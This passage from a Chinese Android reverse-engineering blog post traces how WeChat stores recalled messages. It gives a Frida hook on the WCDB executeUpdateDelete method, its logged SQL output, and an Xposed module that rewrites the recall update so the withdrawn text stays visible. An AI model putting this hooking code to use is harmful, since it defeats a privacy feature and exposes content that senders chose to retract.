escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801939133</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163931</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">3101589936</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[省略...],</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;hQb&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQd&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQe&quot;</span>:<span class="number">0</span>,<span class="string">&quot;hQf&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;what&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>发现大致也是对参数一类型进行判断，最后进行这里</p><p><img src="assets/image-20240611191147091.png" alt="image-20240611191147091"></p><p>发现把map里的数据都进行了赋值操作。</p><p>往下看 发现下图</p><p><img src="assets/image-20240611191500559.png" alt="image-20240611191500559"></p><p>跟进这个a方法，会发现调用了三次update()方法，最后跟到<code>updateWithOnConflict</code>方法</p><p><img src="assets/image-20240611192549530.png" alt="image-20240611192549530"></p><p>打印一下调用栈，如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.updateWithOnConflict</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.update</span>(SourceFile:<span class="number">1726</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.f</span><span class="selector-class">.update</span>(SourceFile:<span class="number">895</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.h</span><span class="selector-class">.update</span>(SourceFile:<span class="number">601</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2426</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2187</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">164</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>其实通过上面打印notifyDataSetChanged观察也知道自己发消息撤回提示是10002，他人发消息撤回是10000</p><p><code>updateWithOnConflict()</code>方法将参数进行sql的拼接，然后使用<code>new SQLiteStatement()</code>创建<code>SQLiteStatement</code>对象，再用<code>executeUpdateDelete()</code>来执行</p><p>Frida hook一下<code>executeUpdateDelete()</code>方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_executeUpdateDelete</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteStatement&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7.1.1.1 executeUpdateDelete&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msql:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mSql</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Args:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mBindArgs</span>.<span class="property">value</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;mDatabase:&quot;,this.mDatabase.value);</span></span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>撤回消息，打印结果为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">1948</span>,<span class="number">10000</span>,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息,<span class="number">1948</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET msgType=?,flag=?,digestUser=?,digest=?,isSend=?,hasTrunc=?,unReadCount=?,conversationTime=?,content=?,username=?,status=? WHERE username=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">10000</span>,<span class="number">1718105683000</span>,,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息:…,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1718105683000</span>,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息:…,wxid_0wk809ov49tq22,<span class="number">3</span>,wxid_0wk809ov49tq22</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET UnReadInvite=?,atCount=? WHERE username= ?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">0</span>,<span class="number">0</span>,wxid_0wk809ov49tq22</span><br></pre></td></tr></table></figure><p>其中的参数<code>msgId</code>是本地的消息id，只有第一条数据库操作指令是<code>WHERE msgId=?</code>的，所以这一步就是找到指定消息然后替换为撤回提示消息。</p><h3 id="xposed实现撤回提示"><a href="#xposed实现撤回提示" class="headerlink" title="xposed实现撤回提示"></a>xposed实现撤回提示</h3><p>不知道为什么我frida打印会出现一次WHERE msgId=?，而手机中却实际出现两次。</p><p>所以哲佬的代码我的结果实现的不是很好，做很很很简单的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package com.example.xposed;</span><br><span class="line">//xposed全局过滤</span><br><span class="line">import android.util.Log;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class Myhook implements IXposedHookLoadPackage &#123;</span><br><span class="line">    int cnt=1;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">        if (!&quot;com.tencent.mm&quot;.equals(lpparam.packageName)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        final String className = &quot;com.tencent.wcdb.database.SQLiteStatement&quot;;</span><br><span class="line">        final String methodName = &quot;executeUpdateDelete&quot;;</span><br><span class="line">        Class&lt;?&gt; SDClazz = XposedHelpers.findClass(className, lpparam.classLoader);</span><br><span class="line">        XposedBridge.hookAllMethods(SDClazz, methodName, new XC_MethodHook() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                super.beforeHookedMethod(param);</span><br><span class="line">                Log.d(&quot;VxHook&quot;, &quot;executeUpdateDelete&quot;);</span><br><span class="line">                Object mDatabase = XposedHelpers.getObjectField(param.thisObject, &quot;mDatabase&quot;);</span><br><span class="line">                String mSql = (String) XposedHelpers.getObjectField(param.thisObject, &quot;mSql&quot;);</span><br><span class="line">                Log.d(&quot;zxk1ng&quot;,mSql);</span><br><span class="line">                Object[] mBindArgs = (Object[]) XposedHelpers.getObjectField(param.thisObject, &quot;mBindArgs&quot;);</span><br><span class="line">                cnt+=1;</span><br><span class="line">                if ((&quot;UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?&quot;.equals(mSql)) &amp;&amp; ((String) mBindArgs[2]).contains(&quot;撤回了一条消息&quot;) &amp;&amp; cnt%2==0 ) &#123;</span><br><span class="line"></span><br><span class="line">                    Object sm = XposedHelpers.newInstance(lpparam.classLoader.loadClass(&quot;com.tencent.wcdb.database.SQLiteStatement&quot;),</span><br><span class="line">                            mDatabase,</span><br><span class="line">                            &quot;select content from message where msgId = ?&quot;,</span><br><span class="line">                            new Object[]&#123;mBindArgs[3]&#125;);</span><br><span class="line">                    String msg = (String) XposedHelpers.callMethod(sm, &quot;simpleQueryForString&quot;);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,msg);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,&quot;===================&quot;);</span><br><span class="line">                    if (!msg.contains(&quot;&lt;msg&gt;&quot;) ) &#123; //不包含时 执行</span><br><span class="line">                        mBindArgs[2] = mBindArgs[2] + &quot;:&quot; + msg;</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;, &quot;对方撤回了：&quot; + msg);</span><br><span class="line"></span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        param.setResult(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android逆向 </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
